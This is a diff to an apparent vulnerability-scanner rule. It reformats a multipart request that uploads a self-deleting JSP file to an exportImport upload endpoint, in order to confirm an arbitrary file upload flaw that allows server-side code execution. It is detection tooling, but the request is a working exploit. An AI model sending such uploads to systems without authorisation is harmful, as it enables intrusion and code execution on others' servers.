@@ -13,7 +13,14 @@ rules:
             path: /page/exportImport/uploadOperation.jsp
             headers:
                 Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed
-            body: "--b0d829daa06c13d6b3e16b0ad21d1eed\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--b0d829daa06c13d6b3e16b0ad21d1eed--\r\n\r\n"
+            body: "\
+                --b0d829daa06c13d6b3e16b0ad21d1eed\r\n\
+                Content-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.jsp\"\r\n\
+                Content-Type: application/octet-stream\r\n\
+                \r\n\
+                <%out.print({{r2}} * {{r3}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+                --b0d829daa06c13d6b3e16b0ad21d1eed--\r\n\
+                "
         expression: response.status == 200
     r1:
         request:
